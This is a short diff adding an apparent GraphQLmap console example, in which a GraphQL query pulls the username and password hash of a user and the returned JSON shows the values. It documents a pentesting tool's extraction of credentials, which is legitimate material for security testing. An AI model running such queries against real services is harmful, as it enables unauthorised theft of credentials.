@@ -1,0 +1,11 @@
+GraphQLmap > {user{username,password}}
+{user{username,password}}
+{
+    "data": {
+        "user": {
+            "password": "5d3c93182bb20f07b994a7f617e99cff",
+            "username": "helpme@helpme.com"
+        }
+    }
+}
+
